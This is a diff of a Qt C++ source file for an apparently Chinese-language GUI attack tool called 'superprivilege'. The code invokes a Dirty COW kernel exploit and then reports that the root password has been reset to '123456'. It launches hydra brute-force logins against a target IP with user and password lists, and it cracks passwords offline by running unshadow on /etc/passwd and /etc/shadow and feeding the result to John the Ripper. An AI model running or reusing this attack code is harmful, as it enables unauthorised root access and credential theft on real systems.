@@ -3,6 +3,9 @@
 #include "dirtycow/dcow.h"
 
 extern QString getcurrenttime();
+int printlog;
+#define ONLINE 0
+#define OFFLINE 1
 
 superprivilege::superprivilege(QWidget *parent) : QWidget(parent)
 {
@@ -41,9 +44,68 @@ superprivilege::superprivilege(QWidget *parent) : QWidget(parent)
     connect(m_buttonOfflineAttack, SIGNAL(clicked()), this, SLOT(offlineAttack()));
     connect(m_itemList, SIGNAL(currentRowChanged(int)), m_stackWidget, SLOT(setCurrentIndex(int)));
 
+    // 处理执行脚本线程的信号
+    connect(&m_cmdThread, &ExecScriptsSlaveThread::scriptResult, this, &superprivilege::processScriptResult);
+
+    // 启动线程
+    m_cmdThread.startSlave();
+
     this->setAutoFillBackground(true);
 }
 
+
+void superprivilege::processScriptResult(const QString & result) {
+    // 对脚本执行结果用换行符分割
+
+    switch(printlog)
+    {
+    case ONLINE:
+        appendOutputOn(result);
+        break;
+    case OFFLINE:
+        appendOutputOff(result);
+        break;
+    }
+
+//    QStringList resultList = result.split("\n");
+//    int modelRowCount = m_model->rowCount();
+
+//    float maxRate = 0;
+//    QString record;
+//    QStringList rowData;
+//    for (int i=0; i < modelRowCount; i++) {
+//        rowData.clear();
+//        if (i < resultList.count()) {
+//            // 按顺序取记录
+//            record = resultList[i];
+
+//            // 使用正则表达式提取数据
+//            QRegExp regExp("PID:(.*)RATE:(.*)NAME:(.*)END");
+//            int pos = record.indexOf(regExp);
+//            if (pos < 0)
+//                continue;
+
+//            if (maxRate < regExp.cap(2).toFloat())
+//                maxRate = regExp.cap(2).toFloat();
+
+//            // 设置表格的行数据
+//            rowData<<regExp.cap(1)<<regExp.cap(3)<<regExp.cap(2);
+
+//        } else {
+//            // 取到的数据不够model的行数时，采用空行
+//            rowData<<""<<""<<"";
+//        }
+//        m_model->setRowData(i, rowData);
+
+//    }
+
+//    // 调整横坐标的尺度，使得图形更协调
+//    m_axisX->setRange(0, maxRate * 8 / 7);
+
+//    // 更新图表
+//    m_model->refresh();
+
+}
 void superprivilege::initItemList(){
     m_itemList = new QListWidget();
 
@@ -82,6 +144,7 @@ void superprivilege::initWidgetVertical()
     m_widgetVertical = new QWidget();
     m_textResultVertical = new QTextEdit();
     m_textResultVertical->setFixedSize(680,320);
+    m_textResultVertical->setReadOnly(true);
 
     // 设置
     QFont fontButton;
@@ -124,6 +187,7 @@ void superprivilege::initWidgetHorizontal()
     m_textResultHorizon->setFixedSize(680,320);
     m_textResultHorizon->setHorizontalScrollBarPolicy(Qt::ScrollBarAlwaysOn);
     m_textResultHorizon->setVerticalScrollBarPolicy(Qt::ScrollBarAlwaysOn);
+    m_textResultHorizon->setReadOnly(true);
 
     // 设置
     QFont fontButton;
@@ -194,6 +258,7 @@ void superprivilege::initWidgetOffline()
     m_widgetOffline = new QWidget();
     m_textResultOffline = new QTextEdit();
     m_textResultOffline->setFixedSize(680,320);
+    m_textResultOffline->setReadOnly(true);
 
     // 设置
     QFont fontButton;
@@ -246,6 +311,7 @@ void superprivilege::initWidgetOnline()
     m_widgetOnline = new QWidget();
     m_textResultOnline = new QTextEdit();
     m_textResultOnline->setFixedSize(680,320);
+    m_textResultOnline->setReadOnly(true);
 
     // 设置
     QFont fontButton;
@@ -282,7 +348,7 @@ void superprivilege::initWidgetOnline()
     labelmode->setText("攻击方式:");
 
     m_ip = new QLineEdit();
-    m_ip->setText("127.0.0.1");
+    m_ip->setText("172.28.128.3");
     m_ip->setFixedSize(150, 24);
 
     m_comboBox =new QComboBox();
@@ -361,7 +427,10 @@ void superprivilege::showAllUser()
 //    QString cmd = "cat /etc/passwd|grep -v nologin|grep -v halt|grep -v shutdown|awk -F":" '{ print $1 }'|more ";
 //    QString cmd = "cat /etc/passwd|grep -v nologin|grep -v halt|grep -v shutdown|awk -F\":\" '{ print $1 }'|more ";
 //    QString cmd = "cat /etc/passwd |cut -f 1 -d :";
+
     QString cmd = "cut -d: -f1 /etc/passwd";
+//    QString cmd = "cat /etc/passwd|grep -v /sbin/login |cut -f1 -d:";
+
     QString result = CSysUtils::execCmd(cmd);
     appendOutputH(result);
 
@@ -469,16 +538,11 @@ int superprivilege::powerAuthority()
     Dcow dcow(true, true);
     dcow.expl();
 /*************************/
-
-
-
-    appendOutputV(runcmd("whoami"));
-    appendOutputV("root new password is 123456");
-
+//    appendOutputV(runcmd("whoami"));
+    appendOutputV("提权完成，root密码已被篡改为\"123456\"");
+    appendOutputV("请先关闭程序，以root用户权限运行该程序测试其他功能");
 
     return 0;
-
-
 
 //    QProcess p(0);
 //    QString cmd = "./37292";
@@ -519,38 +583,28 @@ QString    strTemp=QString::fromLocal8Bit(p->readAllStandardOutput());
 
 void superprivilege::onlineAttack()
 {
+    appendOutputOn("开始在线密码破解...");
     appendOutputOn(runcmd("rm -rf save.log"));
     QString command = "hydra -L user.txt -P password.txt -t 6 -vV -e ns -o save.log "+m_ip->text() + " " + m_comboBox->currentText();
-    appendOutputOn(runcmd(command));
-    appendOutputOn(runcmd("cat save.log"));
 
-    appendOutputOn("Online attack has been done.\n");
+    QByteArray ba = command.toLatin1();
 
-//    return;
+    QFile file("online.sh");
+    file.open(QIODevice::WriteOnly | QIODevice::Text);
+    file.write("rm -rf save.log\n");
+    file.write(ba.data());
+    file.write("\n cat save.log\n");
+    file.close();
 
-//    QProcess p(0);
 
-//    QString cmd = "hydra -L user.txt -P password.txt -t 6 -vV -e ns -o save.log 127.0.0.1 ssh";
-//    QString cmd = "rm -rf save.log";
-//    p.start(cmd);
-//    p.waitForStarted();
-//    p.waitForFinished();
-//    QString strTemp=QString::fromLocal8Bit(p.readAllStandardOutput());
-//    appendOutputOn(strTemp);
+    QString script = g_sWorkingPath + "/online.sh";
 
-//    cmd = "hydra -L user.txt -P password.txt -t 6 -vV -e ns -o save.log "+m_ip->text() + " " + m_comboBox->currentText();
-//    p.start(cmd);
-//    p.waitForStarted();
-//    p.waitForFinished();
-//    strTemp=QString::fromLocal8Bit(p.readAllStandardOutput());
-//    appendOutputOn(strTemp);
+    printlog=ONLINE;
+    m_cmdThread.execScipts(script);
 
-//    cmd = "cat save.log";
-//    p.start(cmd);
-//    p.waitForStarted();
-//    p.waitForFinished();
-//    strTemp=QString::fromLocal8Bit(p.readAllStandardOutput());
-//    appendOutputOn(strTemp);
+//    appendOutputOn(runcmd(command));
+//    appendOutputOn(runcmd("cat save.log"));
+//    appendOutputOn("Online attack has been done.\n");
 
 }
 
@@ -567,122 +621,11 @@ void superprivilege::offlineAttack()
     offlineAttackJohn();
     return;
 
-//    QProcess p(0);
-//    p.start("python3 ./attackpassword.py");
-//    p.waitForStarted();
-//    p.waitForFinished();
-//    QString strTemp=QString::fromLocal8Bit(p.readAllStandardOutput());
-//    appendOutputOff(strTemp);
-
-//    QProcess p(0);
-//    QString cmd = "john mypasswd"; //"unshadow /etc/passwd /etc/shadow > mypasswd";
-
-//    QStringList paramsList;
-//    paramsList.append("/etc/passwd /etc/shadow > mypasswd");
-
-//    paramsList.append("/etc/passwd");
-//    paramsList.append("/etc/shadow");
-//    paramsList.append(">");
-//    paramsList.append("mypasswd111");//etc/shadow > mypasswd
-//    p.start(cmd,paramsList);
-//    p.start(cmd);
-//    p.waitForStarted();
-//    p.waitForFinished();
-//    QString strTemp=QString::fromLocal8Bit(p.readAllStandardOutput());
-//    appendOutputOff(strTemp);
-
-
-//    cmd = "john --show mypasswd"; //"unshadow /etc/passwd /etc/shadow > mypasswd";
-
-//    p.start(cmd);
-//    p.waitForStarted();
-//    p.waitForFinished();
-//    strTemp=QString::fromLocal8Bit(p.readAllStandardOutput());
-//    appendOutputOff(strTemp);
-
-
-    /*
-    QProcess p(0);
-//    p.start("unshadow", QStringList()<<"/etc/passwd /etc/shadow > mypasswd1");
-    p.start("pwd");
-    p.waitForStarted();
-    p.waitForFinished();
-    QString strTemp=QString::fromLocal8Bit(p.readAllStandardOutput());
-    appendOutputOff(strTemp);
-
-    p.start("ls", QStringList()<<"-l");
-    p.waitForStarted();
-    p.waitForFinished();
-    strTemp=QString::fromLocal8Bit(p.readAllStandardOutput());
-    appendOutputOff(strTemp);
-
-//    QMessageBox testMassage;
-//    testMassage.setText(strTemp);
-//    testMassage.exec();
-
-    QProcess proc;
-
-    //! top命令获取系统监控信息
-    // 查询系统监控信息，只获取一次
-    QString cmd = "unshadow"; //"unshadow /etc/passwd /etc/shadow > mypasswd";
-    QStringList paramsList;
-    paramsList.append("/etc/passwd /etc/shadow > mypasswd");
-//    paramsList.append("/etc/passwd");
-//    paramsList.append("/etc/shadow");
-//    paramsList.append(">");
-//    paramsList.append("mypasswd111");//etc/shadow > mypasswd
-    //paramsList << "-b" << "-o" << "%CPU" << "-n" << "1";
-//    paramsList << " /etc/passwd"<<" /etc/shadow "<< "> mypasswd";
-//    paramsList << "/etc/passwd" << "/etc/shadow" << ">" << "mypasswd";
-
-    // 启动命令
-//    QString cmd = "unshadow /etc/passwd /etc/shadow > mypasswd";
-//    proc.start(cmd, paramsList);
-    proc.start(cmd);
-
-    // 读取命令返回结果
-    proc.waitForFinished();
-    QString usageInfo = proc.readAllStandardOutput();
-    appendOutputOff(usageInfo);
-    QString errorInfo = proc.readAllStandardError();
-    if (!errorInfo.isEmpty())
-        return;
-    appendOutputOff(errorInfo);
-/*
-    return;
-
-    QString cmd0 = "unshadow /etc/passwd /etc/shadow > mypasswd";
-    QString result = CSysUtils::execCmd(cmd0);
-    appendOutputOff(result);
-
-    QString cmd1 = "john mypasswd";
-    QString result1 = CSysUtils::execCmd(cmd1);
-    appendOutputOff(result1);
-
-    QString cmd2 = "john --show mypasswd";
-    QString result2 = CSysUtils::execCmd(cmd2);
-    appendOutputOff(result2);
-
-//    cmd = "john mypasswd";
-//    result = CSysUtils::execCmd(cmd);
-//    appendOutputOff(result);
-
-//    cmd = "john --show mypasswd";
-//    result = CSysUtils::execCmd(cmd);
-//    appendOutputOff(result);
-*/
-
 }
 
 void superprivilege::offlineAttackPython()
 {
     appendOutputOff(runcmd("python3 ./attackpassword.py"));
-//    QProcess p(0);
-//    p.start("python3 ./attackpassword.py");
-//    p.waitForStarted();
-//    p.waitForFinished();
-//    QString strTemp=QString::fromLocal8Bit(p.readAllStandardOutput());
-//    appendOutputOff(strTemp);
 }
 
 QString superprivilege::runcmd(QString command)
@@ -697,6 +640,24 @@ QString superprivilege::runcmd(QString command)
 
 void superprivilege::offlineAttackJohn()
 {
+/*
+    QFile file("offline.sh");
+    file.open(QIODevice::WriteOnly | QIODevice::Text);
+//    file.write("rm -rf mypasswd\n");
+//    file.write("umask 077\n");
+    file.write("unshadow /etc/passwd /etc/shadow >mypasswd\n");
+    file.write("john mypasswd\n");
+    file.write("john --show mypasswd\n");
+    file.close();
+
+
+    QString script = g_sWorkingPath + "/offline.sh";
+
+    printlog=OFFLINE;
+    m_cmdThread.execScipts(script);
+/**/
+
+
     appendOutputOff(runcmd("rm -rf mypasswd"));
     appendOutputOff(runcmd("umask 077"));
     QString strRecv=runcmd("unshadow /etc/passwd /etc/shadow");
@@ -707,43 +668,5 @@ void superprivilege::offlineAttackJohn()
 
     appendOutputOff(runcmd("john mypasswd"));
     appendOutputOff(runcmd("john --show mypasswd"));
-    return;
-
-    /*
-    QProcess p(0);
-
-    QString cmd = "umask 077";
-    p.start(cmd);
-    p.waitForStarted();
-    p.waitForFinished();
-    strTemp=QString::fromLocal8Bit(p.readAllStandardOutput());
-
-    cmd = "unshadow /etc/passwd /etc/shadow"; //"unshadow /etc/passwd /etc/shadow > mypasswd";
-    p.start(cmd);
-    p.waitForStarted();
-    p.waitForFinished();
-    QString strTemp=QString::fromLocal8Bit(p.readAllStandardOutput());
-//    QString txt = m_textResultCFG->toPlainText();
-    QFile file("mypasswd");
-    file.open(QIODevice::WriteOnly | QIODevice::Text);
-    file.write(strTemp.toUtf8());
-    file.close();
-
-    appendOutputOff(strTemp);
-
-    cmd = "john mypasswd"; //"unshadow /etc/passwd /etc/shadow > mypasswd";
-    p.start(cmd);
-    p.waitForStarted();
-    p.waitForFinished();
-    strTemp=QString::fromLocal8Bit(p.readAllStandardOutput());
-    appendOutputOff(strTemp);
-
-    cmd = "john --show mypasswd"; //"unshadow /etc/passwd /etc/shadow > mypasswd";
-
-    p.start(cmd);
-    p.waitForStarted();
-    p.waitForFinished();
-    strTemp=QString::fromLocal8Bit(p.readAllStandardOutput());
-    appendOutputOff(strTemp);
-*/
+/**/
 }
